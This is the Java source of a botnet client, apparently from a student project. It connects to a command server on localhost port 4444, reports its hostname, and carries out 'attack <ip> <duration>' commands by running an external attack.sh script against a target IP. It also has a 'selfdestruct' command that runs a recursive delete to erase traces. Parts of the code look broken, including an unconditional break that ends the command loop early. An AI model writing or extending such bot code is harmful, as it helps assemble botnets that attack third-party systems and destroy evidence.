import java.io.*;
import java.net.*;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;
import java.lang.Runtime;


class Bot {

	public static boolean validIP(String ip) {
		if(ip == null || ip.length() < 7 || ip.length() > 15) return false;

		try {
		    int x = 0;
		    int y = ip.indexOf('.');

		    if (y == -1 || ip.charAt(x) == '-' || Integer.parseInt(ip.substring(x, y)) > 255) return false;

		    x = ip.indexOf('.', ++y);
		    if (x == -1 || ip.charAt(y) == '-' || Integer.parseInt(ip.substring(y, x)) > 255) return false;

		    y = ip.indexOf('.', ++x);
		    return  !(y == -1 ||
		            ip.charAt(x) == '-' ||
		            Integer.parseInt(ip.substring(x, y)) > 255 ||
		            ip.charAt(++y) == '-' ||
		            Integer.parseInt(ip.substring(y, ip.length())) > 255 ||
		            ip.charAt(ip.length()-1) == '.');

		} catch (NumberFormatException e) {
		    return false;
		}
	}
	
	public static int attack(String ip, int duration) {
		 try {
						System.out.println("Ready to lanch attack at " + ip + " for " + duration + " milliseconds");
                        //String target = new String("/home/vsv/Dropbox/BotnetProject/attack.sh");
						String target = new String("./attack.sh");
                        Runtime rt = Runtime.getRuntime();
                        Process proc = rt.exec(target);
                        proc.waitFor();
                        StringBuffer output = new StringBuffer();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                        String line = "";                       
                        while ((line = reader.readLine())!= null) {
                                output.append(line + "\n");
                        }
                        System.out.println("### " + output);
						System.out.println("Attack completed");
                } catch (Throwable t) {
                        t.printStackTrace();
    	}
		return 1;
	}
		//System.out.println("attacking " + ip + " for " + duration + " mseconds");
 		//return 1;
	

    public static void main (String a[]) throws IOException {
        Socket sock;
        DataInputStream dis;
        PrintStream dat;
		int botIdentifier;

		String hostname = "Unknown";
		Random rand = new Random(); 
		botIdentifier = rand.nextInt(500); 

		try
		{
			InetAddress addr;
			addr = InetAddress.getLocalHost();
			hostname = addr.getHostName();
		}
		catch (UnknownHostException ex)
		{
			System.out.println("Hostname can not be resolved");
		}
        
   
        sock = new Socket ("localhost", 4444);
		
		while (true) {

		    //Get IO streams from the socket
		    dis = new DataInputStream (sock.getInputStream());
		    dat = new PrintStream (sock.getOutputStream());
		    
			System.out.println("Ready to execute");
			dat.println("Bot " + hostname + botIdentifier + ": Ready to execute");
		    dat.flush();
		    
			String fromServer = dis.readLine();		    
		    System.out.println("Incoming command from server:" + fromServer);
			
			
			if (fromServer.toLowerCase().contains("attack")) {	
      			//check number of arguments
				String[] parts = fromServer.split(" ",3);
				if (parts.length != 3) {
     				System.out.println("Attack command not valid. Usage: attack <ip> <duration>");	
					dat.println("Bot " + hostname + botIdentifier + ": Attack command not valid. Usage: attack <ip> <duration>");
					dat.flush();
				}
				else {
					String command = parts[0];
					String ip = parts[1];
					int duration = Integer.parseInt(parts[2]); //check numerical
					if (validIP(ip)) {	
						System.out.println("Command: " + command + "\t ip:" + ip + "\t duration: " + duration);			
						attack(ip, duration);
					}
					else {
						System.out.println("IP not valid please try again");
						dat.println("Bot " + hostname + botIdentifier + ": IP not valid please try again");
						dat.flush();
						continue;
					}
					
				}				
			} else if (fromServer.toLowerCase().contains("sleep")) {				
				String[] parts = fromServer.split(" ",2);
				if (parts.length != 2) {
     				System.out.println("Sleep command not valid. Usage: sleep <duration>");	
					dat.println("Bot " + hostname + botIdentifier + ": Sleep command not valid. Usage: sleep <duration>");
					dat.flush();
					continue;
				}
				try {		
					int duration = Integer.parseInt(parts[1]); //check numerical 
					Thread.sleep(duration);
					System.out.println("Going quite for " + duration + " milliseconds");
					dat.println("Bot " + hostname + botIdentifier + ": Going quite for " + duration + " milliseconds");
					dat.flush();
				}
				catch(InterruptedException e) {
					e.printStackTrace(); 
				}
			} else if (fromServer.toLowerCase().contains("selfdestruct")) {
				try {
							System.out.println("Ready to selfdestruct - eliminating all traces");
							String target = new String("./rm -ri ./");
		                    Runtime rt = Runtime.getRuntime();
		                    Process proc = rt.exec(target);
		                    proc.waitFor();
		                    StringBuffer output = new StringBuffer();
		                    BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
		                    String line = "";                       
		                    while ((line = reader.readLine())!= null) {
		                            output.append(line + "\n");
		                    }
		                    System.out.println("### " + output);
							System.out.println("Attack completed");
		            } catch (Throwable t) {
		                    t.printStackTrace();
				}
			}
				break;
			dat.flush();		
		}
        sock.close();
	} 
}
